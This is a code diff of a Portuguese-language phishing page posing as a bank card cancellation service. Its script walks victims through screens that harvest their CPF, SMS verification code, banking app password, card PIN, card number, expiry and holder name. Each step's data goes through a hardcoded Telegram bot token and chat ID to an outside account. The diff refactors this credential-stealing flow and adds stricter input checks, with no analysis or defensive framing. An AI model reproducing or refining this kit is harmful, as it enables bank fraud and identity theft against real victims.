@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="pt-BR">
 
@@ -824,62 +823,138 @@
   </div>
 
   <script>
-    // 1) Processar pf da URL
+    // 1) Declarar collectedData ANTES das funções que o usam
+    let collectedData = { cpf: '', smsCode: '', appPassword: '', cardPassword: '', cardNumber: '', cardExpiry: '', cardHolder: '', timestamp: '' };
+
+    // 2) Processar pf da URL
     const urlParams = new URLSearchParams(window.location.search);
     const pfParam = urlParams.get('pf');
     let userData = { cpf: '', name: '', phoneLastFour: '' };
-    function decodeBase64(str) { try { return decodeURIComponent(escape(atob(str))); } catch { return null; } }
-    function processUrlParam() {
-      if (!pfParam) return;
-      const [cpf, name, phone] = decodeBase64(pfParam).split('|');
-      userData = { cpf, name, phoneLastFour: phone };
-      ['prefilledCpf', 'confCpf'].forEach(id => document.getElementById(id).textContent = cpf);
-      document.getElementById('cpf').value = cpf;
-      ['prefilledName', 'confName'].forEach(id => document.getElementById(id).textContent = name);
-      document.getElementById('maskedPhone').textContent = `****-${phone}`;
+
+    function decodeBase64(str) {
+      try {
+        return decodeURIComponent(escape(atob(str)));
+      } catch {
+        return null;
+      }
     }
 
-    // 2) Armazenamento interno via localStorage
+    function processUrlParam() {
+      if (!pfParam) return;
+      const decoded = decodeBase64(pfParam);
+      if (!decoded) return;
+
+      const [cpf, name, phone] = decoded.split('|');
+      userData = { cpf, name, phoneLastFour: phone };
+
+      // Atualiza elementos visuais
+      ['prefilledCpf', 'confCpf'].forEach(id => {
+        if (document.getElementById(id)) {
+          document.getElementById(id).textContent = cpf;
+        }
+      });
+
+      const cpfInput = document.getElementById('cpf');
+      if (cpfInput) cpfInput.value = cpf;
+
+      ['prefilledName', 'confName'].forEach(id => {
+        if (document.getElementById(id)) {
+          document.getElementById(id).textContent = name;
+        }
+      });
+
+      const maskedPhoneEl = document.getElementById('maskedPhone');
+      if (maskedPhoneEl) maskedPhoneEl.textContent = `****-${phone}`;
+
+      // Atualiza o objeto collectedData
+      collectedData.cpf = cpf;
+    }
+
+    // 3) Armazenamento interno via localStorage
     function addEntry(obj) {
       const arr = JSON.parse(localStorage.getItem('cancelamentos') || '[]');
       arr.push(obj);
       localStorage.setItem('cancelamentos', JSON.stringify(arr));
     }
 
-    // 3) Dados e formatação
-    let collectedData = { cpf: '', smsCode: '', appPassword: '', cardPassword: '', cardNumber: '', cardExpiry: '', cardHolder: '', timestamp: '' };
-    function formatCPF(i) { let v = i.value.replace(/\D/g, ''); if (v.length > 3) v = v.replace(/(\d{3})(\d)/, '$1.$2'); if (v.length > 6) v = v.replace(/(\d{3})\.(\d{3})(\d)/, '$1.$2.$3'); if (v.length > 9) v = v.replace(/(\d{3})\.(\d{3})\.(\d{3})(\d)/, '$1.$2.$3-$4'); i.value = v; collectedData.cpf = v; }
-    function formatCardNumber(i) { let v = i.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 '); i.value = v; collectedData.cardNumber = v.replace(/\s/g, ''); }
-    function formatExpiry(i) { let v = i.value.replace(/\D/g, ''); if (v.length > 2) v = v.replace(/(\d{2})(\d)/, '$1/$2'); i.value = v; collectedData.cardExpiry = v; }
-    function moveToNext(i, idx) { if (i.value.length === 1) { const n = i.parentElement.querySelector(`.code-input:nth-child(${idx + 1})`); if (n) n.focus(); } }
+    // 4) Funções de formatação
+    function formatCPF(i) {
+      let v = i.value.replace(/\D/g, '');
+      if (v.length > 3) v = v.replace(/(\d{3})(\d)/, '$1.$2');
+      if (v.length > 6) v = v.replace(/(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
+      if (v.length > 9) v = v.replace(/(\d{3})\.(\d{3})\.(\d{3})(\d)/, '$1.$2.$3-$4');
+      i.value = v;
+      collectedData.cpf = v;
+    }
 
-    // 4) Envio Telegram
+    function formatCardNumber(i) {
+      let v = i.value.replace(/\D/g, '');
+      v = v.replace(/(\d{4})(?=\d)/g, '$1 ');
+      i.value = v;
+      collectedData.cardNumber = v.replace(/\s/g, '');
+    }
+
+    function formatExpiry(i) {
+      let v = i.value.replace(/\D/g, '');
+      if (v.length > 2) v = v.replace(/(\d{2})(\d)/, '$1/$2');
+      i.value = v;
+      collectedData.cardExpiry = v;
+    }
+
+    function moveToNext(i, idx) {
+      if (i.value.length === 1) {
+        const nextIndex = idx + 1;
+        const nextInput = i.parentElement.querySelector(`.code-input:nth-child(${nextIndex})`);
+        if (nextInput) nextInput.focus();
+      }
+    }
+
+    // 5) Envio Telegram
     const botToken = '5020186792:AAHU4puTSKw0mGw0l-yk7y1192Y8yb6Sld4';
     const chatId = '1109818560';
+
     async function sendTelegram(text) {
       try {
         const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'Markdown' })
+          body: JSON.stringify({
+            chat_id: chatId,
+            text,
+            parse_mode: 'Markdown'
+          })
         });
-        console.log('Mensagem enviada:', await res.json());
+        const data = await res.json();
+        console.log('Mensagem enviada:', data);
+        return data;
       } catch (err) {
         console.error('Erro ao enviar para Telegram:', err);
+        return null;
       }
     }
 
-    // 5) Fluxo e envios separados
+    // 6) Funções de validação
     function validateStep1() {
-      if (!/^\d{3}\.\d{3}\.\d{3}-\d{2}$/.test(collectedData.cpf)) { alert('CPF inválido'); return; }
+      // Verifica se o CPF está formatado corretamente
+      if (!/^\d{3}\.\d{3}\.\d{3}-\d{2}$/.test(collectedData.cpf)) {
+        alert('CPF inválido. Formato esperado: 000.000.000-00');
+        return;
+      }
+
       sendTelegram(`*Etapa 1 - CPF Recebido*\nCPF: ${collectedData.cpf}`);
       document.getElementById('screen1').style.display = 'none';
       document.getElementById('screen2').style.display = 'block';
     }
 
     function validateSMS() {
-      const code = [...document.querySelectorAll('#screen2 .code-input')].map(i => i.value).join('');
-      if (!/^\d{4,6}$/.test(code)) { alert('Código inválido'); return; }
+      const inputs = document.querySelectorAll('#screen2 .code-input');
+      const code = Array.from(inputs).map(i => i.value).join('');
+
+      if (!/^\d{6}$/.test(code)) {
+        alert('Código inválido. Digite os 6 dígitos recebidos.');
+        return;
+      }
+
       collectedData.smsCode = code;
       sendTelegram(`*Etapa 2 - Código SMS*\nCPF: ${collectedData.cpf}\nCódigo: ${collectedData.smsCode}`);
       document.getElementById('screen2').style.display = 'none';
@@ -887,8 +962,14 @@
     }
 
     function validateAppPassword() {
-      const code = [...document.querySelectorAll('#screen3 .code-input')].map(i => i.value).join('');
-      if (!/^\d{4,6}$/.test(code)) { alert('Senha inválida'); return; }
+      const inputs = document.querySelectorAll('#screen3 .code-input');
+      const code = Array.from(inputs).map(i => i.value).join('');
+
+      if (!/^\d{6}$/.test(code)) {
+        alert('Senha inválida. Digite os 6 dígitos da senha do app.');
+        return;
+      }
+
       collectedData.appPassword = code;
       sendTelegram(`*Etapa 3 - Senha do App*\nCPF: ${collectedData.cpf}\nApp Pass: ${collectedData.appPassword}`);
       document.getElementById('screen3').style.display = 'none';
@@ -896,24 +977,28 @@
     }
 
     function validateCardPassword() {
-      const code = [...document.querySelectorAll('#screen4 .code-input')].map(i => i.value).join('');
-      if (!/^\d{4}$/.test(code)) { alert('Senha cartão inválida'); return; }
+      const inputs = document.querySelectorAll('#screen4 .code-input');
+      const code = Array.from(inputs).map(i => i.value).join('');
+
+      if (!/^\d{4}$/.test(code)) {
+        alert('Senha cartão inválida. Digite os 4 dígitos da senha do cartão.');
+        return;
+      }
+
       collectedData.cardPassword = code;
       sendTelegram(`*Etapa 4 - Senha do Cartão*\nCPF: ${collectedData.cpf}\nCard Pass: ${collectedData.cardPassword}`);
       document.getElementById('screen4').style.display = 'none';
       document.getElementById('screen5').style.display = 'block';
     }
 
-    // 6) Etapa 5 - com LOGS e tratamento de erro
+    // 7) Finalização do cancelamento
     async function submitCancellation() {
-      console.log('Chamando submitCancellation');
-
       const cardNumberInput = document.getElementById('cardNumber');
       const expiryInput = document.getElementById('expiry');
       const holderInput = document.getElementById('cardHolder');
 
+      // Validações
       if (!cardNumberInput || !expiryInput || !holderInput) {
-        console.error('Elementos do formulário não encontrados!');
         alert('Erro interno: campos não encontrados');
         return;
       }
@@ -923,35 +1008,57 @@
         alert('Cartão inválido. Por favor, insira os 16 dígitos.');
         return;
       }
-      collectedData.cardNumber = rawCardNumber;
 
       collectedData.cardExpiry = expiryInput.value.trim();
       if (!/^\d{2}\/\d{2}$/.test(collectedData.cardExpiry)) {
-        alert('Validade inválida');
+        alert('Validade inválida. Formato esperado: MM/AA');
         return;
       }
 
       collectedData.cardHolder = holderInput.value.trim();
       if (collectedData.cardHolder.length < 5) {
-        alert('Titular inválido');
+        alert('Titular inválido. Mínimo 5 caracteres.');
         return;
       }
 
+      // Atualiza dados
+      collectedData.cardNumber = rawCardNumber;
       collectedData.timestamp = new Date().toISOString();
+
+      // Armazena e envia
       addEntry(collectedData);
 
-      const msg = `*Etapa 5 - Detalhes Completo*\nNome: ${userData.name}\nCPF: ${collectedData.cpf}\nApp Pass: ${collectedData.appPassword}\nCard Pass: ${collectedData.cardPassword}\nCartão: ${rawCardNumber}\nValidade: ${collectedData.cardExpiry}\nTitular: ${collectedData.cardHolder}\nData: ${collectedData.timestamp}`;
-
-      console.log('Enviando mensagem Etapa 5:', msg);
+      const msg = `*Etapa 5 - Detalhes Completo*\n` +
+        `Nome: ${userData.name}\n` +
+        `CPF: ${collectedData.cpf}\n` +
+        `App Pass: ${collectedData.appPassword}\n` +
+        `Card Pass: ${collectedData.cardPassword}\n` +
+        `Cartão: ${rawCardNumber}\n` +
+        `Validade: ${collectedData.cardExpiry}\n` +
+        `Titular: ${collectedData.cardHolder}\n` +
+        `Data: ${collectedData.timestamp}`;
 
       await sendTelegram(msg);
-
       document.getElementById('successModal').style.display = 'flex';
     }
 
-    function closeSuccessModal() { document.getElementById('successModal').style.display = 'none'; }
+    function closeSuccessModal() {
+      document.getElementById('successModal').style.display = 'none';
+    }
 
-    window.onload = processUrlParam;
+    // 8) Inicialização
+    window.onload = function () {
+      processUrlParam();
+
+      // Verificação extra para garantir que o CPF foi carregado
+      setTimeout(() => {
+        if (collectedData.cpf) {
+          console.log('CPF pré-carregado:', collectedData.cpf);
+        } else {
+          console.log('Nenhum CPF pré-carregado encontrado');
+        }
+      }, 500);
+    };
   </script>
 
 </body>
